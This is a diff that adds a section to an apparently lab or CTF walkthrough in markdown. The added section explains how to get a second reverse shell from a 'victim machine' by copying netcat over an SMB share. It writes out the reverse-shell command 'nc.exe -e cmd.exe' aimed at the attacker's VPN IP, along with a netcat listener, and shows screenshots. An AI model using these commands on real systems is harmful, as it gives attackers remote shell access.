@@ -125,4 +125,29 @@ The parameter "*-lws2_32*" specific the library to use for compile:
 
 <p align="center"><img src="https://user-images.githubusercontent.com/43796175/107426914-d26c3680-6aee-11eb-9bd0-d666c78aec4d.jpg"></p>
 
+Now you can get another revShell from your victim machine to you attacker machine. Search netcat in the path of binaries and configure SMB Server for share the file between machines:
 
+Attacker machine:
+
+<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107429043-7525b480-6af1-11eb-8d44-7c02095fae56.jpg"></p>
+
+Victim machine:
+
+<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107429386-d9e10f00-6af1-11eb-96fb-f3850a304cab.jpg"></p>
+
+Then, run netcat in both machines for connection:
+
+
+``
+### Victim machine ###
+
+.\nc.exe -e cmd.exe <yourVpnIP> <yourPORT>
+``
+
+``
+### Attacker machine ###
+
+nc -lnvp 1338
+``
+
+<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107429726-3ba17900-6af2-11eb-8b25-bf034e303e16.jpg"></p>
